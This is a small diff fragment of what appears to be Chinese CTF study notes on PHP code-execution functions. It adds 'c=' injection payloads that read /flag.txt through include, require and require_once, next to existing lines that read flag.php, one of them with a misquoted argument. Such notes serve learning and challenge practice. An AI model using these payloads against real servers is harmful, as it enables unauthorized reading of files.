@@ -15,6 +15,10 @@ c=readfile('flag.php');
 c=print_r(file('flag.php'));
 c=show_source(file(''flag.php));
 c=echo file_get_contents('flag.php');
+c=include('/flag.txt');
+c=require('/flag.txt');
+c=require_once('/flag.txt');
+
 
 ^
 **代码执行函数**
